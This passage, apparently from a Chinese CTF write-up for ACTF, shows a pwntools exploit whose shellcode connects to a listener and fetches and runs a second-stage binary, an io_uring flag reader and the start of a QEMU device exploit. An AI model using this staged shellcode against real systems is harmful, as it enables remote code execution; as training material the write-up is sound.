buffer[BUFSIZE];<br><br>    <span class="hljs-comment">// 初始化参数</span><br>    <br>    <span class="hljs-built_in">memset</span>(&amp;params, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(params));<br>    <span class="hljs-keyword">if</span> (io_uring_queue_init_params(<span class="hljs-number">1</span>, &amp;ring, &amp;params) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;io_uring_queue_init_params&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br><br>    <span class="hljs-comment">// 配置open操作</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_sqe</span> *<span class="hljs-title">sqe</span> =</span> io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_openat(sqe, AT_FDCWD, <span class="hljs-string">&quot;flag.txt&quot;</span>, O_RDONLY, <span class="hljs-number">0</span>);<br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>   <br>    <span class="hljs-comment">// 提交open操作</span><br>    io_uring_submit(&amp;ring);<br><br>    <span class="hljs-comment">// 配置read操作</span><br>    sqe = io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_read(sqe, <span class="hljs-number">5</span>, buffer, BUFSIZE, <span class="hljs-number">0</span>);<br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>    <br>    <span class="hljs-comment">// 提交read操作</span><br>    io_uring_submit(&amp;ring);<br>    <br>    sqe = io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_write(sqe, STDOUT_FILENO, buffer, BUFSIZE, <span class="hljs-number">0</span>);<br><br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>    <br>    <span class="hljs-comment">// 提交write操作</span><br>    io_uring_submit(&amp;ring);<br>    <br>    <span class="hljs-comment">// 等待操作完成</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_cqe</span> *<span class="hljs-title">cqe</span>;</span><br>    <span class="hljs-keyword">if</span> (io_uring_wait_cqe(&amp;ring, &amp;cqe) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;io_uring_wait_cqe&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>   <br>    <span class="hljs-comment">// 提交所有操作</span><br>    io_uring_submit(&amp;ring);<br><br>    <span class="hljs-comment">// 清理</span><br>    io_uring_cq_advance(&amp;ring, <span class="hljs-number">2</span>);<br>    io_uring_queue_exit(&amp;ring);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Socket_struct</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> *<span class="hljs-title">serv_addr</span> =</span> <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in));<br>    <span class="hljs-built_in">memset</span>(serv_addr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in));<br>    serv_addr-&gt;sin_family = AF_INET;<br>    serv_addr-&gt;sin_addr.s_addr = inet_addr(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<br>    serv_addr-&gt;sin_port = htons(<span class="hljs-number">8888</span>);<br>    print_binary(serv_addr,<span class="hljs-number">16</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在终端开</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cat io_uring <span class="hljs-string">| nc -l 8888</span><br></code></pre></td></tr></table></figure><p>再执行exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> ctypes<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;43.132.193.22&#x27;</span>, <span class="hljs-number">9998</span>)<br><span class="hljs-keyword">else</span>:<br>    r = process(<span class="hljs-string">&#x27;./master-of-orw&#x27;</span>)<br>    p = process(<span class="hljs-string">&quot;./master-of-orw&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>socket_struct = <span class="hljs-number">0x020022b87f000001</span><br>asm_socket = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rax, 41</span><br><span class="hljs-string">mov rdi, 2</span><br><span class="hljs-string">mov rsi, 1</span><br><span class="hljs-string">xor rdx, rdx</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>push_socket_struct = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov r15, 0x0100007fb8220002</span><br><span class="hljs-string">push r15</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>asm_connect = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">mov rdi, 3</span><br><span class="hljs-string">mov rdx, 0x10</span><br><span class="hljs-string">mov rax, 42</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>cyc_recv = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rsi, 0x400000</span><br><span class="hljs-string">mov r14, 0xcfcc8</span><br><span class="hljs-string"></span><br><span class="hljs-string">again:</span><br><span class="hljs-string">mov edi, 3</span><br><span class="hljs-string">mov rdx, 0x1000</span><br><span class="hljs-string">mov r10d, 0</span><br><span class="hljs-string">xor r8d, r8d</span><br><span class="hljs-string">xor r9d, r9d</span><br><span class="hljs-string">mov eax, 45 ;// recvfrom</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">add rsi, rax</span><br><span class="hljs-string">sub r14, rax</span><br><span class="hljs-string">cmp r14,0</span><br><span class="hljs-string">jge again</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x401620</span><br><span class="hljs-string">ret</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode = asm(shellcraft.mmap(<span class="hljs-number">0x400000</span>,<span class="hljs-number">0x100000</span>,<span class="hljs-number">7</span>,<span class="hljs-number">33</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)) + \<br>            asm(asm_socket) + asm(push_socket_struct) + asm(asm_connect) + \<br>            asm(cyc_recv)<br><br><br><br>sl(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/img/ACTF/7.png" alt="img"></p><h3 id="题目之外–about-io-uring"><a href="#题目之外–about-io-uring" class="headerlink" title="题目之外–about io_uring"></a>题目之外–about io_uring</h3><p>源码康<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/uapi/linux/io_uring.h">这里</a></p><p>io_uring_op还挺丰富</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">io_uring_op</span> &#123;</span><br>IORING_OP_NOP,<br>IORING_OP_READV,<br>IORING_OP_WRITEV,<br>IORING_OP_FSYNC,<br>IORING_OP_READ_FIXED,<br>IORING_OP_WRITE_FIXED,<br>IORING_OP_POLL_ADD,<br>IORING_OP_POLL_REMOVE,<br>IORING_OP_SYNC_FILE_RANGE,<br>IORING_OP_SENDMSG,<br>IORING_OP_RECVMSG,<br>IORING_OP_TIMEOUT,<br>IORING_OP_TIMEOUT_REMOVE,<br>IORING_OP_ACCEPT,<br>IORING_OP_ASYNC_CANCEL,<br>IORING_OP_LINK_TIMEOUT,<br>IORING_OP_CONNECT,<br>IORING_OP_FALLOCATE,<br>IORING_OP_OPENAT,<br>IORING_OP_CLOSE,<br>IORING_OP_FILES_UPDATE,<br>IORING_OP_STATX,<br>IORING_OP_READ,<br>IORING_OP_WRITE,<br>IORING_OP_FADVISE,<br>IORING_OP_MADVISE,<br>IORING_OP_SEND,<br>IORING_OP_RECV,<br>IORING_OP_OPENAT2,<br>IORING_OP_EPOLL_CTL,<br>IORING_OP_SPLICE,<br>IORING_OP_PROVIDE_BUFFERS,<br>IORING_OP_REMOVE_BUFFERS,<br>IORING_OP_TEE,<br>IORING_OP_SHUTDOWN,<br>IORING_OP_RENAMEAT,<br>IORING_OP_UNLINKAT,<br>IORING_OP_MKDIRAT,<br>IORING_OP_SYMLINKAT,<br>IORING_OP_LINKAT,<br>IORING_OP_MSG_RING,<br>IORING_OP_FSETXATTR,<br>IORING_OP_SETXATTR,<br>IORING_OP_FGETXATTR,<br>IORING_OP_GETXATTR,<br>IORING_OP_SOCKET,<br>IORING_OP_URING_CMD,<br>IORING_OP_SEND_ZC,<br>IORING_OP_SENDMSG_ZC,<br><br><span class="hljs-comment">/* this goes last, obviously */</span><br>IORING_OP_LAST,<br>&#125;;<br></code></pre></td></tr></table></figure><p>找到了偏移量的设置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_SQ_RING0ULL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_CQ_RING0x8000000ULL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_SQES0x10000000ULL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_PBUF_RING0x80000000ULL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_PBUF_SHIFT16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IORING_OFF_MMAP_MASK0xf8000000ULL</span><br><br>IORING_OFF_SQ_RING：这是用于访问 Submission Queue Ring（SQ Ring）的偏移量。SQ Ring 用于存储I/O请求的提交队列<br><br>IORING_OFF_SQES：这是用于访问 Submission Queue Entry（SQE）的偏移量。SQE 是I/O请求的数据结构，用于描述I/O操作的各个参数。<br></code></pre></td></tr></table></figure><p>也就解释了为什么对应第一个mmap的offset&#x3D;0，第二个mmap的offset&#x3D;0x10000000</p><h2 id="qemu-playground"><a href="#qemu-playground" class="headerlink" title="qemu-playground"></a>qemu-playground</h2><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>👴先声明，这是👴人生中第一个逆向题，👴连那个核心算法都没看明白。👴输入了原始数据试一下，再把得到的数据输进去，然后，就没有然后了，👴就拿到了flag</p><p><img src="/img/ACTF/8.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-comment">// #define PAGE_SHIFT 12</span><br><span class="hljs-comment">// #define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT) // 4096</span><br><span class="hljs-comment">// #define PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-comment">// #define PFN_PFN ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-comment">// #define PMIO_BASE 0x000000000000c000</span><br><span class="hljs-comment">// #define CSR(_x) ((_x) &lt;&lt; 3)</span><br><span class="hljs-comment">// #define CSR5_TS_SUSPENDED 6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMIO_BASE 0XC040</span><br><br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* mmio_mem;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> *((<span class="hljs-type">uint64_t</span> *)(mmio_mem + addr));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span><br>&#123;<br>    *((<span class="hljs-type">uint32_t</span>*)(mmio_mem + addr)) = value;<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">pmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> value)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> inl(PMIO_BASE + value);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> 